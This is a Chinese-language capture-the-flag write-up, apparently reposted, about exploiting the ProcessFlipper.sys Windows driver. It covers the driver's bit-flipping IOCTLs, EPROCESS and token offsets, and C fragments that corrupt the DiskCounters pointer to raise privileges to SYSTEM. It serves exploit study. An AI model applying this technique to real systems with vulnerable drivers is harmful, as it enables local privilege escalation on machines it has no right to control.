# Sekai CTF  ProcessFlipper.sys 驱动漏洞分析与利用

> 原文: https://www.ctfiot.com/210611.html
> ID: 210611

challenge 简介

目标是成为 NT Authority/System 并读取旗帜。玩家需要通过一个网页前端提交编译的代码，自动化的漏洞利用器运行这些代码，并将截图返回给玩家。该挑战使用了 windows 11 24H2 版本的 Windows，提供了驱动文件 ProcessFlipper.sys。作者还提到挑战与 抽卡游戏 有关。
摘自作者博客文章：该挑战灵感来自于驱动程序 wfshbr64.sys，该驱动程序存在一个可以操纵 EPROCESS 结构中任意位的漏洞，从而导致本地权限提升。

逆向驱动

首先在 IDA 中打开驱动程序。DriverEntry 是驱动程序的入口，就像二进制文件的 main 函数一样。打开反汇编窗口，你可以看到 WdfDriverCreate、WdfBindInfo …… 这些表明这是一个 KMDF 驱动程序。因此，WDM 是 Windows 的传统驱动程序，最终所有驱动程序都是 WDM 驱动程序，它们也更容易逆向。KMDF 是 内核模式驱动程序框架，它封装了 WDM，并提供了良好的 API，使驱动程序开发（尤其是硬件驱动程序开发）变得更容易，所以现代驱动程序大多偏向于使用 KMDF。逆向这个驱动程序并不容易，你需要为 IDA Pro 中的 KDMF 驱动程序添加符号表，所以我转向寻找驱动的 IOCTL，因为大多数漏洞都在那里。

作者实现了两个 IOCTL，它们的 IOCTL 代码是 0x222004 和 0x222008。两个 IOCTL 都对 EPROCESS 对象的元素做了些操作，你可以看到它检查大小是否小于 0x5c00，即 0xb80 *8，这是 Windows 11 24H2 上 EPROCESS 对象的大小。第一个 IOCTL 获取要翻转的位的偏移量并翻转该位，第二个 IOCTL 清除这些位。（你需要查看它是通过位运算来清除位的）

初步概览

我在 Windows 10 22H2 上尝试这个，除了 Token 和 DiskCounters 的偏移量不同，解决方案没有变化。你可以通过 Vergilius 网站检查这些结构随 Windows 版本的变化。
有关调试器的基本设置，我建议你遵循 OpenSecurityTraining2 的高级 Windbg 课程。你需要将 Windows 设置为“测试模式”以便附加 Windbg 调试器，并使用 OSRLoader 加载驱动程序。

注册服务并启动服务，你可以通过 Windbg 确认这一点。

windbg

_TOKEN 是一个内核对象，描述了进程的安全上下文，包含进程权限等信息。你可以使用 Windbg 中的 dt nt!_TOKEN 命令查看该对象。有两种方法可以提升进程的权限：

第一种方法：将你想要提升权限的进程的 token 替换为 system 进程（系统中权限最高的进程，pid 为 4）的 token。

第二种方法：更改 _TOKEN 对象的 privileges.present 和 privileges.enabled 值，以启用 SeDebugPrivilege。


```
kd> dqs ffffc703`d61b1080 + 8b8 l2     
ffffc703`d61b1938  ffffc703`d61b1ac0    <---- DiskCounter
ffffc703`d61b1940  00000000`00000000
kd> dqs ffffc703`d61b1080 + 4b8 l2
ffffc703`d61b1538  ffff848a`436c0064     <---- token
ffffc703`d61b1540  00000000`00000000
//0x28 bytes (sizeof)
struct _PROCESS_DISK_COUNTERS
{
    ULONGLONG BytesRead;                                                    //0x0
    ULONGLONG BytesWritten;                                                 //0x8
    ULONGLONG ReadOperationCount;                                           //0x10
    ULONGLONG WriteOperationCount;                                          //0x18
    ULONGLONG FlushOperationCount;                                          //0x20
};
    #define ProcessFlipper "\\.\ProcessFlipper"

HANDLE file = CreateFileA(ProcessFlipper, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (file == INVALID_HANDLE_VALUE) {
 printf("[CreateFileA] failed to open handle to processflipper (0x%08X)n", GetLastError());
 return EXIT_FAILURE;
}
else {
 printf("[+] ProcessFlipper handle : 0x%08Xn", (INT)file);
}
bool patch_diskcounter(HANDLE file)
{
 ULONG value = tokenoffset + 0x80 - 0x8;     // add 0x80 to point to token and subtract to get pointed by BytesWritten 

 for (int i = 0; i < 12; i++)
 {
  ULONG BitToFlip = diskCounterOffset * 8 + i;     // bits needed 
  ULONG BytesReturned;

  DWORD ioctlcode = (((ULONG_PTR)value >> i) & 1) ? IOCTL_PROCESS_SET : IOCTL_PROCESS_CLEAR ;
  if (!DeviceIoControl(file, ioctlcode, &BitToFlip, sizeof(BitToFlip), NULL, 0, &BytesReturned, NULL)) {
   printf("[patch_diskcounter] [%d] DeviceIoControlCode failed (0x%08X)n", i, GetLastError());
   return FALSE;
  }
 }

 return TRUE;
}
int EnableSeDebugPrivilege()
{
 SYSTEM_PROCESS_INFORMATION spi;
 ULONG status, i;
 ULONG ReturnLength;

 status = NtQuerySystemInformation(SystemExtendedProcessInformation, &spi, sizeof(SYSTEM_PROCESS_INFORMATION), &ReturnLength);
 // Check status and error handling 

 for (i = 0; i < spi.NumberOfThreads; i++)
 {
  if (spi.Threads[i].ClientId.UniqueProcess == GetCurrentProcessId())
  {
   printf("[+] found matching process id : %x", spi.Threads[i].ClientId.UniqueProcess);
   // modify privileges for SeDebugPrivilege
  }
 }
 return 0;
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729212848.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/10-1729212849.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1729212849.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/2-1729212850.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1729212850.png)